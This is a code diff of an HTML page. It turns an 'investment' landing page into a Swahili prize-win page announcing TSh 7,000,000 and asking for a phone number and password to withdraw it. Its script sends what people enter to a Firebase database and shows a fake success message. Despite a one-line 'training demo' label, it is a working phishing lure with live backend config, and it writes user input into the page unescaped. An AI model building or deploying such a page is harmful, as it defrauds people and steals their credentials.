@@ -1,145 +1,199 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 <head>
-    <meta charset="UTF-8">
-    <title>Digital Wallet Investment</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ushindi – DEMO</title>
 
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js"></script>
+  <style>
+    :root{
+      --green:#16a34a;
+      --green-dark:#0f7a36;
+      --bg:#020617;
+      --border:#1f2937;
+      --muted:#9ca3af;
+    }
 
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-            color: white;
-            text-align: center;
-        }
+    body{
+      font-family: Arial, Helvetica, sans-serif;
+      background:#0f172a;
+      color:#e5e7eb;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      height:100vh;
+      margin:0;
+    }
 
-        .container {
-            padding: 40px 20px;
-        }
+    .card{
+      background:var(--bg);
+      border-radius:16px;
+      box-shadow:0 15px 40px rgba(0,0,0,.45);
+      padding:30px;
+      max-width:420px;
+      width:100%;
+      border:1px solid var(--border);
+    }
 
-        h1 {
-            font-size: 32px;
-            margin-bottom: 10px;
-        }
+    h1{color:var(--green);text-align:center;margin:0}
+    .status{text-align:center;color:var(--green);margin-top:6px}
+    .amount{text-align:center;font-size:34px;font-weight:800;color:var(--green);margin:18px 0}
+    .divider{height:1px;background:var(--border);margin:18px 0}
 
-        p {
-            font-size: 18px;
-            max-width: 600px;
-            margin: 0 auto 20px;
-        }
+    label{margin-top:14px;display:block;color:var(--muted)}
+    input{
+      width:100%;
+      padding:12px;
+      margin-top:6px;
+      border-radius:10px;
+      border:1px solid var(--border);
+      background:#020617;
+      color:#e5e7eb;
+    }
 
-        .features {
-            margin-top: 40px;
-        }
+    button{
+      margin-top:22px;
+      width:100%;
+      padding:14px;
+      border-radius:12px;
+      border:none;
+      background:var(--green);
+      font-weight:800;
+      cursor:pointer;
+    }
 
-        .feature-box {
-            background: rgba(255,255,255,0.1);
-            padding: 20px;
-            margin: 15px auto;
-            border-radius: 10px;
-            max-width: 500px;
-        }
+    button:hover{
+      background:var(--green-dark);
+      color:#ecfdf5;
+    }
 
-        .cta {
-            margin-top: 50px;
-        }
+    .note{text-align:center;font-size:12px;color:var(--muted);margin-top:14px}
 
-        .signup-btn {
-            background: #00c853;
-            color: white;
-            padding: 15px 40px;
-            font-size: 18px;
-            border: none;
-            border-radius: 30px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
+    /* POPUP */
+    .popup{
+      position:fixed;
+      inset:0;
+      background:rgba(2,6,23,.75);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:999;
+    }
+    .popup.active{display:flex}
 
-        .signup-btn:hover {
-            background: #00e676;
-            transform: scale(1.05);
-        }
+    .popup-card{
+      background:#020617;
+      border-radius:16px;
+      padding:28px;
+      max-width:380px;
+      width:90%;
+      text-align:center;
+      border:1px solid var(--border);
+    }
 
-        footer {
-            margin-top: 50px;
-            font-size: 14px;
-            opacity: 0.7;
-        }
-    </style>
+    .popup-card h2{color:var(--green)}
+  </style>
 </head>
+
 <body>
 
-<div class="container">
+<div class="card">
+  <h1>Hongera 🎉</h1>
+  <div class="status">Umeshinda Kikamilifu</div>
+  <div class="amount">TSh 7,000,000</div>
 
-    <h1>Welcome to Digital Wallet Investment</h1>
+  <div class="divider"></div>
 
-    <p>
-        Grow your money smarter. Invest securely. Track your earnings in real time.
-        Join thousands of investors already building financial freedom.
-    </p>
+  <label>Namba ya Simu</label>
+  <input id="phone" placeholder="+255XXXXXXXXX">
 
-    <div class="features">
+  <label>Nenosiri (DEMO)</label>
+  <input id="password" type="password" placeholder="********">
 
-        <div class="feature-box">
-            <h3>💰 High ROI Investment Plans</h3>
-            <p>Earn competitive returns with transparent growth tracking.</p>
-        </div>
-
-        <div class="feature-box">
-            <h3>🔐 Secure & Reliable</h3>
-            <p>Your funds are protected with advanced Firebase security infrastructure.</p>
-        </div>
-
-        <div class="feature-box">
-            <h3>📊 Real-Time Dashboard</h3>
-            <p>Monitor your balance and investments live anytime, anywhere.</p>
-        </div>
-
-    </div>
-
-    <div class="cta">
-        <h2>Start Your Investment Journey Today</h2>
-        <button class="signup-btn" onclick="goToSignup()">Sign Up Now</button>
-    </div>
-
-    <footer>
-        © 2026 Digital Wallet Investment | All Rights Reserved
-    </footer>
-
+  <button id="withdraw">Endelea Kutoa Kiasi</button>
+  <p class="note">DEMO ya mafunzo — si huduma halisi.</p>
 </div>
 
-<script>
-    // Firebase Configuration
-    const firebaseConfig = {
-        apiKey: "AIzaSyDaEphuY2kQue8m-20DDs68JDgQirAycBE",
-        authDomain: "digital-wallet-40297.firebaseapp.com",
-        databaseURL: "https://digital-wallet-40297-default-rtdb.firebaseio.com",
-        projectId: "digital-wallet-40297",
-        storageBucket: "digital-wallet-40297.firebasestorage.app",
-        messagingSenderId: "953454788272",
-        appId: "1:953454788272:android:961fd704f587cf1b8c8575"
-    };
+<!-- POPUP -->
+<div class="popup" id="popup">
+  <div class="popup-card">
+    <h2 id="popupTitle">Ombi Limefanikiwa ✅</h2>
+    <p id="popupText"></p>
+    <button onclick="popup.classList.remove('active')">Sawa</button>
+  </div>
+</div>
 
-    // Initialize Firebase
-    const app = firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+  import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-    // Example connection test
-    firebase.database().ref("platform_status").set({
-        online: true,
-        lastUpdated: new Date().toISOString()
-    });
+  /* FIREBASE CONFIG */
+  const firebaseConfig = {
+    apiKey: "AIzaSyDaEphuY2kQue8m-20DDs68JDgQirAycBE",
+    authDomain: "digital-wallet-40297.firebaseapp.com",
+    databaseURL: "https://digital-wallet-40297-default-rtdb.firebaseio.com",
+    projectId: "digital-wallet-40297",
+    storageBucket: "digital-wallet-40297.firebasestorage.app",
+    messagingSenderId: "953454788272",
+    appId: "1:953454788272:android:961fd704f587cf1b8c8575"
+  };
 
-    // Redirect function
-    function goToSignup() {
-        window.location.href = "signup.html";
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  const popup = document.getElementById("popup");
+  const popupText = document.getElementById("popupText");
+  const popupTitle = document.getElementById("popupTitle");
+
+  const phoneInput = document.getElementById("phone");
+  const passwordInput = document.getElementById("password");
+
+  document.getElementById("withdraw").addEventListener("click", async () => {
+    const phone = phoneInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    if(!phone.startsWith("+255") || phone.length < 13 || password.length < 4){
+      popupTitle.innerText = "Tatizo ❌";
+      popupText.innerHTML = "Tafadhali weka namba ya simu sahihi na nenosiri la DEMO.";
+      popup.classList.add("active");
+      return;
     }
+
+    // Show popup immediately
+    popupTitle.innerText = "Inatumwa ⏳";
+    popupText.innerHTML = `Kutuma ombi la kutoa TSh 7,000,000 kwa <strong style="color:#16a34a">${phone}</strong>...`;
+    popup.classList.add("active");
+
+    try {
+      await push(ref(db, "withdrawRequests"), {
+        phone,
+        passwordDemo: password,
+        amount: 7000000,
+        currency: "TZS",
+        status: "pending",
+        createdAt: serverTimestamp()
+      });
+
+      // Success
+      popupTitle.innerText = "Ombi Limefanikiwa ✅";
+      popupText.innerHTML = `
+        Umefanikiwa kutuma ombi la kutoa
+        <strong style="color:#16a34a">TSh 7,000,000</strong>.<br><br>
+        Subiri ujumbe kwenye simu yako <strong>${phone}</strong>.
+      `;
+      console.log("Data imehifadhiwa kwenye Firebase (DEMO)");
+    } catch(err) {
+      // Failure
+      popupTitle.innerText = "Tatizo ❌";
+      popupText.innerHTML = `
+        Ombi halikufanikani kuwasilishwa.<br>
+        Angalia internet au ruhusa za Firebase. <br>
+        <strong>${err.message}</strong>
+      `;
+      console.error("Firebase write failed:", err);
+    }
+  });
 </script>
 
 </body>
-  </html>
+</html>
